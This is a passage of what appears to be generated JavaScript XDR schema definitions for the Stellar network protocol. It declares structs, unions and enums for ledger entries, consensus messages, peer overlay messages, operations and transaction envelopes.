                v1: x.lookup("LedgerEntryExtensionV1")
            }
        }),
        x.struct("LedgerEntry", [["lastModifiedLedgerSeq", x.lookup("Uint32")], ["data", x.lookup("LedgerEntryData")], ["ext", x.lookup("LedgerEntryExt")]]),
        x.struct("LedgerKeyAccount", [["accountId", x.lookup("AccountId")]]),
        x.struct("LedgerKeyTrustLine", [["accountId", x.lookup("AccountId")], ["asset", x.lookup("TrustLineAsset")]]),
        x.struct("LedgerKeyOffer", [["sellerId", x.lookup("AccountId")], ["offerId", x.lookup("Int64")]]),
        x.struct("LedgerKeyData", [["accountId", x.lookup("AccountId")], ["dataName", x.lookup("String64")]]),
        x.struct("LedgerKeyClaimableBalance", [["balanceId", x.lookup("ClaimableBalanceId")]]),
        x.struct("LedgerKeyLiquidityPool", [["liquidityPoolId", x.lookup("PoolId")]]),
        x.union("LedgerKey", {
            switchOn: x.lookup("LedgerEntryType"),
            switchName: "type",
            switches: [["account", "account"], ["trustline", "trustLine"], ["offer", "offer"], ["data", "data"], ["claimableBalance", "claimableBalance"], ["liquidityPool", "liquidityPool"]],
            arms: {
                account: x.lookup("LedgerKeyAccount"),
                trustLine: x.lookup("LedgerKeyTrustLine"),
                offer: x.lookup("LedgerKeyOffer"),
                data: x.lookup("LedgerKeyData"),
                claimableBalance: x.lookup("LedgerKeyClaimableBalance"),
                liquidityPool: x.lookup("LedgerKeyLiquidityPool")
            }
        }),
        x.enum("EnvelopeType", {
            envelopeTypeTxV0: 0,
            envelopeTypeScp: 1,
            envelopeTypeTx: 2,
            envelopeTypeAuth: 3,
            envelopeTypeScpvalue: 4,
            envelopeTypeTxFeeBump: 5,
            envelopeTypeOpId: 6,
            envelopeTypePoolRevokeOpId: 7
        }),
        x.typedef("UpgradeType", x.varOpaque(128)),
        x.enum("StellarValueType", {
            stellarValueBasic: 0,
            stellarValueSigned: 1
        }),
        x.struct("LedgerCloseValueSignature", [["nodeId", x.lookup("NodeId")], ["signature", x.lookup("Signature")]]),
        x.union("StellarValueExt", {
            switchOn: x.lookup("StellarValueType"),
            switchName: "v",
            switches: [["stellarValueBasic", x.void()], ["stellarValueSigned", "lcValueSignature"]],
            arms: {
                lcValueSignature: x.lookup("LedgerCloseValueSignature")
            }
        }),
        x.struct("StellarValue", [["txSetHash", x.lookup("Hash")], ["closeTime", x.lookup("TimePoint")], ["upgrades", x.varArray(x.lookup("UpgradeType"), 6)], ["ext", x.lookup("StellarValueExt")]]),
        x.const("MASK_LEDGERHEADER_FLAGS", 7),
        x.enum("LedgerHeaderFlags", {
            disableLiquidityPoolTradingFlag: 1,
            disableLiquidityPoolDepositFlag: 2,
            disableLiquidityPoolWithdrawalFlag: 4
        }),
        x.union("LedgerHeaderExtensionV1Ext", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()]],
            arms: {}
        }),
        x.struct("LedgerHeaderExtensionV1", [["flags", x.lookup("Uint32")], ["ext", x.lookup("LedgerHeaderExtensionV1Ext")]]),
        x.union("LedgerHeaderExt", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()], [1, "v1"]],
            arms: {
                v1: x.lookup("LedgerHeaderExtensionV1")
            }
        }),
        x.struct("LedgerHeader", [["ledgerVersion", x.lookup("Uint32")], ["previousLedgerHash", x.lookup("Hash")], ["scpValue", x.lookup("StellarValue")], ["txSetResultHash", x.lookup("Hash")], ["bucketListHash", x.lookup("Hash")], ["ledgerSeq", x.lookup("Uint32")], ["totalCoins", x.lookup("Int64")], ["feePool", x.lookup("Int64")], ["inflationSeq", x.lookup("Uint32")], ["idPool", x.lookup("Uint64")], ["baseFee", x.lookup("Uint32")], ["baseReserve", x.lookup("Uint32")], ["maxTxSetSize", x.lookup("Uint32")], ["skipList", x.array(x.lookup("Hash"), 4)], ["ext", x.lookup("LedgerHeaderExt")]]),
        x.enum("LedgerUpgradeType", {
            ledgerUpgradeVersion: 1,
            ledgerUpgradeBaseFee: 2,
            ledgerUpgradeMaxTxSetSize: 3,
            ledgerUpgradeBaseReserve: 4,
            ledgerUpgradeFlags: 5
        }),
        x.union("LedgerUpgrade", {
            switchOn: x.lookup("LedgerUpgradeType"),
            switchName: "type",
            switches: [["ledgerUpgradeVersion", "newLedgerVersion"], ["ledgerUpgradeBaseFee", "newBaseFee"], ["ledgerUpgradeMaxTxSetSize", "newMaxTxSetSize"], ["ledgerUpgradeBaseReserve", "newBaseReserve"], ["ledgerUpgradeFlags", "newFlags"]],
            arms: {
                newLedgerVersion: x.lookup("Uint32"),
                newBaseFee: x.lookup("Uint32"),
                newMaxTxSetSize: x.lookup("Uint32"),
                newBaseReserve: x.lookup("Uint32"),
                newFlags: x.lookup("Uint32")
            }
        }),
        x.enum("BucketEntryType", {
            metaentry: -1,
            liveentry: 0,
            deadentry: 1,
            initentry: 2
        }),
        x.union("BucketMetadataExt", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()]],
            arms: {}
        }),
        x.struct("BucketMetadata", [["ledgerVersion", x.lookup("Uint32")], ["ext", x.lookup("BucketMetadataExt")]]),
        x.union("BucketEntry", {
            switchOn: x.lookup("BucketEntryType"),
            switchName: "type",
            switches: [["liveentry", "liveEntry"], ["initentry", "liveEntry"], ["deadentry", "deadEntry"], ["metaentry", "metaEntry"]],
            arms: {
                liveEntry: x.lookup("LedgerEntry"),
                deadEntry: x.lookup("LedgerKey"),
                metaEntry: x.lookup("BucketMetadata")
            }
        }),
        x.struct("TransactionSet", [["previousLedgerHash", x.lookup("Hash")], ["txes", x.varArray(x.lookup("TransactionEnvelope"), 2147483647)]]),
        x.struct("TransactionResultPair", [["transactionHash", x.lookup("Hash")], ["result", x.lookup("TransactionResult")]]),
        x.struct("TransactionResultSet", [["results", x.varArray(x.lookup("TransactionResultPair"), 2147483647)]]),
        x.union("TransactionHistoryEntryExt", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()]],
            arms: {}
        }),
        x.struct("TransactionHistoryEntry", [["ledgerSeq", x.lookup("Uint32")], ["txSet", x.lookup("TransactionSet")], ["ext", x.lookup("TransactionHistoryEntryExt")]]),
        x.union("TransactionHistoryResultEntryExt", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()]],
            arms: {}
        }),
        x.struct("TransactionHistoryResultEntry", [["ledgerSeq", x.lookup("Uint32")], ["txResultSet", x.lookup("TransactionResultSet")], ["ext", x.lookup("TransactionHistoryResultEntryExt")]]),
        x.union("LedgerHeaderHistoryEntryExt", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()]],
            arms: {}
        }),
        x.struct("LedgerHeaderHistoryEntry", [["hash", x.lookup("Hash")], ["header", x.lookup("LedgerHeader")], ["ext", x.lookup("LedgerHeaderHistoryEntryExt")]]),
        x.struct("LedgerScpMessages", [["ledgerSeq", x.lookup("Uint32")], ["messages", x.varArray(x.lookup("ScpEnvelope"), 2147483647)]]),
        x.struct("ScpHistoryEntryV0", [["quorumSets", x.varArray(x.lookup("ScpQuorumSet"), 2147483647)], ["ledgerMessages", x.lookup("LedgerScpMessages")]]),
        x.union("ScpHistoryEntry", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, "v0"]],
            arms: {
                v0: x.lookup("ScpHistoryEntryV0")
            }
        }),
        x.enum("LedgerEntryChangeType", {
            ledgerEntryCreated: 0,
            ledgerEntryUpdated: 1,
            ledgerEntryRemoved: 2,
            ledgerEntryState: 3
        }),
        x.union("LedgerEntryChange", {
            switchOn: x.lookup("LedgerEntryChangeType"),
            switchName: "type",
            switches: [["ledgerEntryCreated", "created"], ["ledgerEntryUpdated", "updated"], ["ledgerEntryRemoved", "removed"], ["ledgerEntryState", "state"]],
            arms: {
                created: x.lookup("LedgerEntry"),
                updated: x.lookup("LedgerEntry"),
                removed: x.lookup("LedgerKey"),
                state: x.lookup("LedgerEntry")
            }
        }),
        x.typedef("LedgerEntryChanges", x.varArray(x.lookup("LedgerEntryChange"), 2147483647)),
        x.struct("OperationMeta", [["changes", x.lookup("LedgerEntryChanges")]]),
        x.struct("TransactionMetaV1", [["txChanges", x.lookup("LedgerEntryChanges")], ["operations", x.varArray(x.lookup("OperationMeta"), 2147483647)]]),
        x.struct("TransactionMetaV2", [["txChangesBefore", x.lookup("LedgerEntryChanges")], ["operations", x.varArray(x.lookup("OperationMeta"), 2147483647)], ["txChangesAfter", x.lookup("LedgerEntryChanges")]]),
        x.union("TransactionMeta", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, "operations"], [1, "v1"], [2, "v2"]],
            arms: {
                operations: x.varArray(x.lookup("OperationMeta"), 2147483647),
                v1: x.lookup("TransactionMetaV1"),
                v2: x.lookup("TransactionMetaV2")
            }
        }),
        x.struct("TransactionResultMeta", [["result", x.lookup("TransactionResultPair")], ["feeProcessing", x.lookup("LedgerEntryChanges")], ["txApplyProcessing", x.lookup("TransactionMeta")]]),
        x.struct("UpgradeEntryMeta", [["upgrade", x.lookup("LedgerUpgrade")], ["changes", x.lookup("LedgerEntryChanges")]]),
        x.struct("LedgerCloseMetaV0", [["ledgerHeader", x.lookup("LedgerHeaderHistoryEntry")], ["txSet", x.lookup("TransactionSet")], ["txProcessing", x.varArray(x.lookup("TransactionResultMeta"), 2147483647)], ["upgradesProcessing", x.varArray(x.lookup("UpgradeEntryMeta"), 2147483647)], ["scpInfo", x.varArray(x.lookup("ScpHistoryEntry"), 2147483647)]]),
        x.union("LedgerCloseMeta", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, "v0"]],
            arms: {
                v0: x.lookup("LedgerCloseMetaV0")
            }
        }),
        x.enum("ErrorCode", {
            errMisc: 0,
            errData: 1,
            errConf: 2,
            errAuth: 3,
            errLoad: 4
        }),
        x.struct("Error", [["code", x.lookup("ErrorCode")], ["msg", x.string(100)]]),
        x.struct("AuthCert", [["pubkey", x.lookup("Curve25519Public")], ["expiration", x.lookup("Uint64")], ["sig", x.lookup("Signature")]]),
        x.struct("Hello", [["ledgerVersion", x.lookup("Uint32")], ["overlayVersion", x.lookup("Uint32")], ["overlayMinVersion", x.lookup("Uint32")], ["networkId", x.lookup("Hash")], ["versionStr", x.string(100)], ["listeningPort", x.int()], ["peerId", x.lookup("NodeId")], ["cert", x.lookup("AuthCert")], ["nonce", x.lookup("Uint256")]]),
        x.struct("Auth", [["unused", x.int()]]),
        x.enum("IpAddrType", {
            iPv4: 0,
            iPv6: 1
        }),
        x.union("PeerAddressIp", {
            switchOn: x.lookup("IpAddrType"),
            switchName: "type",
            switches: [["iPv4", "ipv4"], ["iPv6", "ipv6"]],
            arms: {
                ipv4: x.opaque(4),
                ipv6: x.opaque(16)
            }
        }),
        x.struct("PeerAddress", [["ip", x.lookup("PeerAddressIp")], ["port", x.lookup("Uint32")], ["numFailures", x.lookup("Uint32")]]),
        x.enum("MessageType", {
            errorMsg: 0,
            auth: 2,
            dontHave: 3,
            getPeers: 4,
            peers: 5,
            getTxSet: 6,
            txSet: 7,
            transaction: 8,
            getScpQuorumset: 9,
            scpQuorumset: 10,
            scpMessage: 11,
            getScpState: 12,
            hello: 13,
            surveyRequest: 14,
            surveyResponse: 15
        }),
        x.struct("DontHave", [["type", x.lookup("MessageType")], ["reqHash", x.lookup("Uint256")]]),
        x.enum("SurveyMessageCommandType", {
            surveyTopology: 0
        }),
        x.struct("SurveyRequestMessage", [["surveyorPeerId", x.lookup("NodeId")], ["surveyedPeerId", x.lookup("NodeId")], ["ledgerNum", x.lookup("Uint32")], ["encryptionKey", x.lookup("Curve25519Public")], ["commandType", x.lookup("SurveyMessageCommandType")]]),
        x.struct("SignedSurveyRequestMessage", [["requestSignature", x.lookup("Signature")], ["request", x.lookup("SurveyRequestMessage")]]),
        x.typedef("EncryptedBody", x.varOpaque(64e3)),
        x.struct("SurveyResponseMessage", [["surveyorPeerId", x.lookup("NodeId")], ["surveyedPeerId", x.lookup("NodeId")], ["ledgerNum", x.lookup("Uint32")], ["commandType", x.lookup("SurveyMessageCommandType")], ["encryptedBody", x.lookup("EncryptedBody")]]),
        x.struct("SignedSurveyResponseMessage", [["responseSignature", x.lookup("Signature")], ["response", x.lookup("SurveyResponseMessage")]]),
        x.struct("PeerStats", [["id", x.lookup("NodeId")], ["versionStr", x.string(100)], ["messagesRead", x.lookup("Uint64")], ["messagesWritten", x.lookup("Uint64")], ["bytesRead", x.lookup("Uint64")], ["bytesWritten", x.lookup("Uint64")], ["secondsConnected", x.lookup("Uint64")], ["uniqueFloodBytesRecv", x.lookup("Uint64")], ["duplicateFloodBytesRecv", x.lookup("Uint64")], ["uniqueFetchBytesRecv", x.lookup("Uint64")], ["duplicateFetchBytesRecv", x.lookup("Uint64")], ["uniqueFloodMessageRecv", x.lookup("Uint64")], ["duplicateFloodMessageRecv", x.lookup("Uint64")], ["uniqueFetchMessageRecv", x.lookup("Uint64")], ["duplicateFetchMessageRecv", x.lookup("Uint64")]]),
        x.typedef("PeerStatList", x.varArray(x.lookup("PeerStats"), 25)),
        x.struct("TopologyResponseBody", [["inboundPeers", x.lookup("PeerStatList")], ["outboundPeers", x.lookup("PeerStatList")], ["totalInboundPeerCount", x.lookup("Uint32")], ["totalOutboundPeerCount", x.lookup("Uint32")]]),
        x.union("SurveyResponseBody", {
            switchOn: x.lookup("SurveyMessageCommandType"),
            switchName: "type",
            switches: [["surveyTopology", "topologyResponseBody"]],
            arms: {
                topologyResponseBody: x.lookup("TopologyResponseBody")
            }
        }),
        x.union("StellarMessage", {
            switchOn: x.lookup("MessageType"),
            switchName: "type",
            switches: [["errorMsg", "error"], ["hello", "hello"], ["auth", "auth"], ["dontHave", "dontHave"], ["getPeers", x.void()], ["peers", "peers"], ["getTxSet", "txSetHash"], ["txSet", "txSet"], ["transaction", "transaction"], ["surveyRequest", "signedSurveyRequestMessage"], ["surveyResponse", "signedSurveyResponseMessage"], ["getScpQuorumset", "qSetHash"], ["scpQuorumset", "qSet"], ["scpMessage", "envelope"], ["getScpState", "getScpLedgerSeq"]],
            arms: {
                error: x.lookup("Error"),
                hello: x.lookup("Hello"),
                auth: x.lookup("Auth"),
                dontHave: x.lookup("DontHave"),
                peers: x.varArray(x.lookup("PeerAddress"), 100),
                txSetHash: x.lookup("Uint256"),
                txSet: x.lookup("TransactionSet"),
                transaction: x.lookup("TransactionEnvelope"),
                signedSurveyRequestMessage: x.lookup("SignedSurveyRequestMessage"),
                signedSurveyResponseMessage: x.lookup("SignedSurveyResponseMessage"),
                qSetHash: x.lookup("Uint256"),
                qSet: x.lookup("ScpQuorumSet"),
                envelope: x.lookup("ScpEnvelope"),
                getScpLedgerSeq: x.lookup("Uint32")
            }
        }),
        x.struct("AuthenticatedMessageV0", [["sequence", x.lookup("Uint64")], ["message", x.lookup("StellarMessage")], ["mac", x.lookup("HmacSha256Mac")]]),
        x.union("AuthenticatedMessage", {
            switchOn: x.lookup("Uint32"),
            switchName: "v",
            switches: [[0, "v0"]],
            arms: {
                v0: x.lookup("AuthenticatedMessageV0")
            }
        }),
        x.typedef("Value", x.varOpaque()),
        x.struct("ScpBallot", [["counter", x.lookup("Uint32")], ["value", x.lookup("Value")]]),
        x.enum("ScpStatementType", {
            scpStPrepare: 0,
            scpStConfirm: 1,
            scpStExternalize: 2,
            scpStNominate: 3
        }),
        x.struct("ScpNomination", [["quorumSetHash", x.lookup("Hash")], ["votes", x.varArray(x.lookup("Value"), 2147483647)], ["accepted", x.varArray(x.lookup("Value"), 2147483647)]]),
        x.struct("ScpStatementPrepare", [["quorumSetHash", x.lookup("Hash")], ["ballot", x.lookup("ScpBallot")], ["prepared", x.option(x.lookup("ScpBallot"))], ["preparedPrime", x.option(x.lookup("ScpBallot"))], ["nC", x.lookup("Uint32")], ["nH", x.lookup("Uint32")]]),
        x.struct("ScpStatementConfirm", [["ballot", x.lookup("ScpBallot")], ["nPrepared", x.lookup("Uint32")], ["nCommit", x.lookup("Uint32")], ["nH", x.lookup("Uint32")], ["quorumSetHash", x.lookup("Hash")]]),
        x.struct("ScpStatementExternalize", [["commit", x.lookup("ScpBallot")], ["nH", x.lookup("Uint32")], ["commitQuorumSetHash", x.lookup("Hash")]]),
        x.union("ScpStatementPledges", {
            switchOn: x.lookup("ScpStatementType"),
            switchName: "type",
            switches: [["scpStPrepare", "prepare"], ["scpStConfirm", "confirm"], ["scpStExternalize", "externalize"], ["scpStNominate", "nominate"]],
            arms: {
                prepare: x.lookup("ScpStatementPrepare"),
                confirm: x.lookup("ScpStatementConfirm"),
                externalize: x.lookup("ScpStatementExternalize"),
                nominate: x.lookup("ScpNomination")
            }
        }),
        x.struct("ScpStatement", [["nodeId", x.lookup("NodeId")], ["slotIndex", x.lookup("Uint64")], ["pledges", x.lookup("ScpStatementPledges")]]),
        x.struct("ScpEnvelope", [["statement", x.lookup("ScpStatement")], ["signature", x.lookup("Signature")]]),
        x.struct("ScpQuorumSet", [["threshold", x.lookup("Uint32")], ["validators", x.varArray(x.lookup("NodeId"), 2147483647)], ["innerSets", x.varArray(x.lookup("ScpQuorumSet"), 2147483647)]]),
        x.union("LiquidityPoolParameters", {
            switchOn: x.lookup("LiquidityPoolType"),
            switchName: "type",
            switches: [["liquidityPoolConstantProduct", "constantProduct"]],
            arms: {
                constantProduct: x.lookup("LiquidityPoolConstantProductParameters")
            }
        }),
        x.struct("MuxedAccountMed25519", [["id", x.lookup("Uint64")], ["ed25519", x.lookup("Uint256")]]),
        x.union("MuxedAccount", {
            switchOn: x.lookup("CryptoKeyType"),
            switchName: "type",
            switches: [["keyTypeEd25519", "ed25519"], ["keyTypeMuxedEd25519", "med25519"]],
            arms: {
                ed25519: x.lookup("Uint256"),
                med25519: x.lookup("MuxedAccountMed25519")
            }
        }),
        x.struct("DecoratedSignature", [["hint", x.lookup("SignatureHint")], ["signature", x.lookup("Signature")]]),
        x.enum("OperationType", {
            createAccount: 0,
            payment: 1,
            pathPaymentStrictReceive: 2,
            manageSellOffer: 3,
            createPassiveSellOffer: 4,
            setOptions: 5,
            changeTrust: 6,
            allowTrust: 7,
            accountMerge: 8,
            inflation: 9,
            manageData: 10,
            bumpSequence: 11,
            manageBuyOffer: 12,
            pathPaymentStrictSend: 13,
            createClaimableBalance: 14,
            claimClaimableBalance: 15,
            beginSponsoringFutureReserves: 16,
            endSponsoringFutureReserves: 17,
            revokeSponsorship: 18,
            clawback: 19,
            clawbackClaimableBalance: 20,
            setTrustLineFlags: 21,
            liquidityPoolDeposit: 22,
            liquidityPoolWithdraw: 23
        }),
        x.struct("CreateAccountOp", [["destination", x.lookup("AccountId")], ["startingBalance", x.lookup("Int64")]]),
        x.struct("PaymentOp", [["destination", x.lookup("MuxedAccount")], ["asset", x.lookup("Asset")], ["amount", x.lookup("Int64")]]),
        x.struct("PathPaymentStrictReceiveOp", [["sendAsset", x.lookup("Asset")], ["sendMax", x.lookup("Int64")], ["destination", x.lookup("MuxedAccount")], ["destAsset", x.lookup("Asset")], ["destAmount", x.lookup("Int64")], ["path", x.varArray(x.lookup("Asset"), 5)]]),
        x.struct("PathPaymentStrictSendOp", [["sendAsset", x.lookup("Asset")], ["sendAmount", x.lookup("Int64")], ["destination", x.lookup("MuxedAccount")], ["destAsset", x.lookup("Asset")], ["destMin", x.lookup("Int64")], ["path", x.varArray(x.lookup("Asset"), 5)]]),
        x.struct("ManageSellOfferOp", [["selling", x.lookup("Asset")], ["buying", x.lookup("Asset")], ["amount", x.lookup("Int64")], ["price", x.lookup("Price")], ["offerId", x.lookup("Int64")]]),
        x.struct("ManageBuyOfferOp", [["selling", x.lookup("Asset")], ["buying", x.lookup("Asset")], ["buyAmount", x.lookup("Int64")], ["price", x.lookup("Price")], ["offerId", x.lookup("Int64")]]),
        x.struct("CreatePassiveSellOfferOp", [["selling", x.lookup("Asset")], ["buying", x.lookup("Asset")], ["amount", x.lookup("Int64")], ["price", x.lookup("Price")]]),
        x.struct("SetOptionsOp", [["inflationDest", x.option(x.lookup("AccountId"))], ["clearFlags", x.option(x.lookup("Uint32"))], ["setFlags", x.option(x.lookup("Uint32"))], ["masterWeight", x.option(x.lookup("Uint32"))], ["lowThreshold", x.option(x.lookup("Uint32"))], ["medThreshold", x.option(x.lookup("Uint32"))], ["highThreshold", x.option(x.lookup("Uint32"))], ["homeDomain", x.option(x.lookup("String32"))], ["signer", x.option(x.lookup("Signer"))]]),
        x.union("ChangeTrustAsset", {
            switchOn: x.lookup("AssetType"),
            switchName: "type",
            switches: [["assetTypeNative", x.void()], ["assetTypeCreditAlphanum4", "alphaNum4"], ["assetTypeCreditAlphanum12", "alphaNum12"], ["assetTypePoolShare", "liquidityPool"]],
            arms: {
                alphaNum4: x.lookup("AlphaNum4"),
                alphaNum12: x.lookup("AlphaNum12"),
                liquidityPool: x.lookup("LiquidityPoolParameters")
            }
        }),
        x.struct("ChangeTrustOp", [["line", x.lookup("ChangeTrustAsset")], ["limit", x.lookup("Int64")]]),
        x.struct("AllowTrustOp", [["trustor", x.lookup("AccountId")], ["asset", x.lookup("AssetCode")], ["authorize", x.lookup("Uint32")]]),
        x.struct("ManageDataOp", [["dataName", x.lookup("String64")], ["dataValue", x.option(x.lookup("DataValue"))]]),
        x.struct("BumpSequenceOp", [["bumpTo", x.lookup("SequenceNumber")]]),
        x.struct("CreateClaimableBalanceOp", [["asset", x.lookup("Asset")], ["amount", x.lookup("Int64")], ["claimants", x.varArray(x.lookup("Claimant"), 10)]]),
        x.struct("ClaimClaimableBalanceOp", [["balanceId", x.lookup("ClaimableBalanceId")]]),
        x.struct("BeginSponsoringFutureReservesOp", [["sponsoredId", x.lookup("AccountId")]]),
        x.enum("RevokeSponsorshipType", {
            revokeSponsorshipLedgerEntry: 0,
            revokeSponsorshipSigner: 1
        }),
        x.struct("RevokeSponsorshipOpSigner", [["accountId", x.lookup("AccountId")], ["signerKey", x.lookup("SignerKey")]]),
        x.union("RevokeSponsorshipOp", {
            switchOn: x.lookup("RevokeSponsorshipType"),
            switchName: "type",
            switches: [["revokeSponsorshipLedgerEntry", "ledgerKey"], ["revokeSponsorshipSigner", "signer"]],
            arms: {
                ledgerKey: x.lookup("LedgerKey"),
                signer: x.lookup("RevokeSponsorshipOpSigner")
            }
        }),
        x.struct("ClawbackOp", [["asset", x.lookup("Asset")], ["from", x.lookup("MuxedAccount")], ["amount", x.lookup("Int64")]]),
        x.struct("ClawbackClaimableBalanceOp", [["balanceId", x.lookup("ClaimableBalanceId")]]),
        x.struct("SetTrustLineFlagsOp", [["trustor", x.lookup("AccountId")], ["asset", x.lookup("Asset")], ["clearFlags", x.lookup("Uint32")], ["setFlags", x.lookup("Uint32")]]),
        x.const("LIQUIDITY_POOL_FEE_V18", 30),
        x.struct("LiquidityPoolDepositOp", [["liquidityPoolId", x.lookup("PoolId")], ["maxAmountA", x.lookup("Int64")], ["maxAmountB", x.lookup("Int64")], ["minPrice", x.lookup("Price")], ["maxPrice", x.lookup("Price")]]),
        x.struct("LiquidityPoolWithdrawOp", [["liquidityPoolId", x.lookup("PoolId")], ["amount", x.lookup("Int64")], ["minAmountA", x.lookup("Int64")], ["minAmountB", x.lookup("Int64")]]),
        x.union("OperationBody", {
            switchOn: x.lookup("OperationType"),
            switchName: "type",
            switches: [["createAccount", "createAccountOp"], ["payment", "paymentOp"], ["pathPaymentStrictReceive", "pathPaymentStrictReceiveOp"], ["manageSellOffer", "manageSellOfferOp"], ["createPassiveSellOffer", "createPassiveSellOfferOp"], ["setOptions", "setOptionsOp"], ["changeTrust", "changeTrustOp"], ["allowTrust", "allowTrustOp"], ["accountMerge", "destination"], ["inflation", x.void()], ["manageData", "manageDataOp"], ["bumpSequence", "bumpSequenceOp"], ["manageBuyOffer", "manageBuyOfferOp"], ["pathPaymentStrictSend", "pathPaymentStrictSendOp"], ["createClaimableBalance", "createClaimableBalanceOp"], ["claimClaimableBalance", "claimClaimableBalanceOp"], ["beginSponsoringFutureReserves", "beginSponsoringFutureReservesOp"], ["endSponsoringFutureReserves", x.void()], ["revokeSponsorship", "revokeSponsorshipOp"], ["clawback", "clawbackOp"], ["clawbackClaimableBalance", "clawbackClaimableBalanceOp"], ["setTrustLineFlags", "setTrustLineFlagsOp"], ["liquidityPoolDeposit", "liquidityPoolDepositOp"], ["liquidityPoolWithdraw", "liquidityPoolWithdrawOp"]],
            arms: {
                createAccountOp: x.lookup("CreateAccountOp"),
                paymentOp: x.lookup("PaymentOp"),
                pathPaymentStrictReceiveOp: x.lookup("PathPaymentStrictReceiveOp"),
                manageSellOfferOp: x.lookup("ManageSellOfferOp"),
                createPassiveSellOfferOp: x.lookup("CreatePassiveSellOfferOp"),
                setOptionsOp: x.lookup("SetOptionsOp"),
                changeTrustOp: x.lookup("ChangeTrustOp"),
                allowTrustOp: x.lookup("AllowTrustOp"),
                destination: x.lookup("MuxedAccount"),
                manageDataOp: x.lookup("ManageDataOp"),
                bumpSequenceOp: x.lookup("BumpSequenceOp"),
                manageBuyOfferOp: x.lookup("ManageBuyOfferOp"),
                pathPaymentStrictSendOp: x.lookup("PathPaymentStrictSendOp"),
                createClaimableBalanceOp: x.lookup("CreateClaimableBalanceOp"),
                claimClaimableBalanceOp: x.lookup("ClaimClaimableBalanceOp"),
                beginSponsoringFutureReservesOp: x.lookup("BeginSponsoringFutureReservesOp"),
                revokeSponsorshipOp: x.lookup("RevokeSponsorshipOp"),
                clawbackOp: x.lookup("ClawbackOp"),
                clawbackClaimableBalanceOp: x.lookup("ClawbackClaimableBalanceOp"),
                setTrustLineFlagsOp: x.lookup("SetTrustLineFlagsOp"),
                liquidityPoolDepositOp: x.lookup("LiquidityPoolDepositOp"),
                liquidityPoolWithdrawOp: x.lookup("LiquidityPoolWithdrawOp")
            }
        }),
        x.struct("Operation", [["sourceAccount", x.option(x.lookup("MuxedAccount"))], ["body", x.lookup("OperationBody")]]),
        x.struct("OperationIdId", [["sourceAccount", x.lookup("AccountId")], ["seqNum", x.lookup("SequenceNumber")], ["opNum", x.lookup("Uint32")]]),
        x.struct("OperationIdRevokeId", [["sourceAccount", x.lookup("AccountId")], ["seqNum", x.lookup("SequenceNumber")], ["opNum", x.lookup("Uint32")], ["liquidityPoolId", x.lookup("PoolId")], ["asset", x.lookup("Asset")]]),
        x.union("OperationId", {
            switchOn: x.lookup("EnvelopeType"),
            switchName: "type",
            switches: [["envelopeTypeOpId", "id"], ["envelopeTypePoolRevokeOpId", "revokeId"]],
            arms: {
                id: x.lookup("OperationIdId"),
                revokeId: x.lookup("OperationIdRevokeId")
            }
        }),
        x.enum("MemoType", {
            memoNone: 0,
            memoText: 1,
            memoId: 2,
            memoHash: 3,
            memoReturn: 4
        }),
        x.union("Memo", {
            switchOn: x.lookup("MemoType"),
            switchName: "type",
            switches: [["memoNone", x.void()], ["memoText", "text"], ["memoId", "id"], ["memoHash", "hash"], ["memoReturn", "retHash"]],
            arms: {
                text: x.string(28),
                id: x.lookup("Uint64"),
                hash: x.lookup("Hash"),
                retHash: x.lookup("Hash")
            }
        }),
        x.struct("TimeBounds", [["minTime", x.lookup("TimePoint")], ["maxTime", x.lookup("TimePoint")]]),
        x.const("MAX_OPS_PER_TX", 100),
        x.union("TransactionV0Ext", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()]],
            arms: {}
        }),
        x.struct("TransactionV0", [["sourceAccountEd25519", x.lookup("Uint256")], ["fee", x.lookup("Uint32")], ["seqNum", x.lookup("SequenceNumber")], ["timeBounds", x.option(x.lookup("TimeBounds"))], ["memo", x.lookup("Memo")], ["operations", x.varArray(x.lookup("Operation"), x.lookup("MAX_OPS_PER_TX"))], ["ext", x.lookup("TransactionV0Ext")]]),
        x.struct("TransactionV0Envelope", [["tx", x.lookup("TransactionV0")], ["signatures", x.varArray(x.lookup("DecoratedSignature"), 20)]]),
        x.union("TransactionExt", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()]],
            arms: {}
        }),
        x.struct("Transaction", [["sourceAccount", x.lookup("MuxedAccount")], ["fee", x.lookup("Uint32")], ["seqNum", x.lookup("SequenceNumber")], ["timeBounds", x.option(x.lookup("TimeBounds"))], ["memo", x.lookup("Memo")], ["operations", x.varArray(x.lookup("Operation"), x.lookup("MAX_OPS_PER_TX"))], ["ext", x.lookup("TransactionExt")]]),
        x.struct("TransactionV1Envelope", [["tx", x.lookup("Transaction")], ["signatures", x.varArray(x.lookup("DecoratedSignature"), 20)]]),
        x.union("FeeBumpTransactionInnerTx", {
            switchOn: x.lookup("EnvelopeType"),
            switchName: "type",
            switches: [["envelopeTypeTx", "v1"]],
            arms: {
                v1: x.lookup("TransactionV1Envelope")
            }
        }),
        x.union("FeeBumpTransactionExt", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()]],
            arms: {}
        }),
        x.struct("FeeBumpTransaction", [["feeSource", x.lookup("MuxedAccount")], ["fee", x.lookup("Int64")], ["innerTx", x.lookup("FeeBumpTransactionInnerTx")], ["ext", x.lookup("FeeBumpTransactionExt")]]),
        x.struct("FeeBumpTransactionEnvelope", [["tx", x.lookup("FeeBumpTransaction")], ["signatures", x.varArray(x.lookup("DecoratedSignature"), 20)]]),
        x.union("TransactionEnvelope", {
            switchOn: x.lookup("EnvelopeType"),
            switchName: "type",
            switches: [["envelopeTypeTxV0", "v0"], ["envelopeTypeTx", "v1"], ["envelopeTypeTxFeeBump", "feeBump"]],
            arms: {
                v0: x.lookup("TransactionV0Envelope"),
                v1: x.lookup("TransactionV1Envelope"),
                feeBump: x.lookup("FeeBumpTransactionEnvelope")
            }
        }),
        x.union("TransactionSignaturePayloadTaggedTransaction", {
            switchOn: x.lookup("EnvelopeType"),
            switchName: "type",
            switches: [["envelopeTypeTx", "tx"], ["envelopeTypeTxFeeBump", "feeBump"]],
            arms: {
